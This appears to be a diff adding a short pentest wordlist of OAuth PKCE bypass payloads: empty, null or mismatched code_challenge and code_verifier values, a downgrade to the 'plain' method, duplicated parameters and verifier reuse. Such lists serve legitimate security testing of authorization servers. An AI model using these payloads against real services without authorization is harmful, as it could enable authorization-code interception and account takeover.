@@ -1,0 +1,24 @@
+# PKCE bypass payloads
+# Remove code_challenge entirely
+# Empty code_challenge
+code_challenge=
+# Null code_challenge
+code_challenge=null
+# Empty code_verifier
+code_verifier=
+# Mismatched code_verifier
+code_verifier=INVALID
+# Null code_verifier
+code_verifier=null
+# Non-S256 method (plain)
+code_challenge_method=plain
+# Remove code_challenge_method
+# S256 but empty challenge
+code_challenge=&code_challenge_method=S256
+# Double PKCE parameters
+code_challenge=ABC&code_challenge=DEF
+# code_challenge without code_challenge_method
+code_challenge=E2C3A... (SHA256 hash)
+# omit code_verifier at token endpoint
+# send same code_verifier for different codes
+# send same code_verifier for the same code twice
